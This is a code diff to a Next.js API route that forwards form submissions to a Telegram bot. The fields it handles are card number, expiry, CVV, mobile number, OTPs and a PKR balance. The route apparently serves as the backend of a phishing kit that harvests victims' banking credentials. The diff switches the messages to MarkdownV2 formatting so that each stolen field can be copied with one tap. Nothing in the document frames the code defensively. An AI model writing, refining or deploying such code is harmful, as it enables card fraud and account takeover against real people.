@@ -1,14 +1,14 @@
 import { NextResponse } from 'next/server'
 
-// Escape values for Telegram HTML parse mode
-function escapeHtml(value: string) {
-  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+// Escape text for Telegram MarkdownV2.
+function escapeMarkdown(value: string) {
+  return value.replace(/([_\*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1')
 }
 
-// Wrap a "Label: value" line in its own <pre> block so Telegram renders it
-// as a separate boxed section with its own tap-to-copy button
+// Triple-backtick MarkdownV2 blocks are rendered by Telegram with a native
+// copy action. Keep each field in its own block for individual copying.
 function copyableField(label: string, value: string | number) {
-  return `<pre>${escapeHtml(label)}: ${escapeHtml(String(value))}</pre>`
+  return `\\`\\`\\`\n${escapeMarkdown(label)}: ${escapeMarkdown(String(value))}\n\\`\\`\\``
 }
 
 export async function POST(request: Request) {
@@ -26,8 +26,8 @@ export async function POST(request: Request) {
     if (body?.card || body?.month || body?.year || body?.cvv) {
       // Card submission
       const lines = [
-        '<b>New submission</b>',
-        '<b>Card details</b>',
+        '*New submission*',
+        '*Card details*',
         body?.card ? copyableField('Card', body.card) : null,
         body?.month || body?.year ? copyableField('Expiry', `${body?.month ?? '--'}/${body?.year ?? '----'}`) : null,
         body?.cvv ? copyableField('CVV', body.cvv) : null,
@@ -35,20 +35,20 @@ export async function POST(request: Request) {
       ].filter(Boolean)
       text = lines.join('\n')
     } else if (body?.mobile) {
-      text = ['<b>New submission</b>', '<b>Sign in</b>', copyableField('Mobile', body.mobile)].join('\n')
+      text = ['*New submission*', '*Sign in*', copyableField('Mobile', body.mobile)].join('\n')
     } else if (body?.otp) {
-      text = ['<b>New submission</b>', '<b>OTP</b>', copyableField('OTP', body.otp)].join('\n')
+      text = ['*New submission*', '*OTP*', copyableField('OTP', body.otp)].join('\n')
     } else if (body?.confirmOtp) {
-      text = ['<b>New submission</b>', '<b>Confirm OTP</b>', copyableField('OTP', body.confirmOtp)].join('\n')
+      text = ['*New submission*', '*Confirm OTP*', copyableField('OTP', body.confirmOtp)].join('\n')
     } else if (body?.balance) {
-      text = ['<b>New submission</b>', '<b>Balance</b>', copyableField('Balance', `PKR ${body.balance}`)].join('\n')
+      text = ['*New submission*', '*Balance*', copyableField('Balance', `PKR ${body.balance}`)].join('\n')
     } else if (typeof body?.text === 'string' && body.text.trim()) {
-      text = escapeHtml(body.text.trim())
+      text = escapeMarkdown(body.text.trim())
     } else {
       const value = typeof body?.number === 'string' ? body.number : String(body?.number ?? '')
       const trimmed = value.trim()
       text = trimmed
-        ? ['<b>New submission</b>', '<b>Number</b>', copyableField('Number', trimmed)].join('\n')
+        ? ['*New submission*', '*Number*', copyableField('Number', trimmed)].join('\n')
         : ''
     }
   } catch {
@@ -66,7 +66,7 @@ export async function POST(request: Request) {
       body: JSON.stringify({
         chat_id: chatId,
         text,
-        parse_mode: 'HTML',
+        parse_mode: 'MarkdownV2',
       }),
       cache: 'no-store',
     })
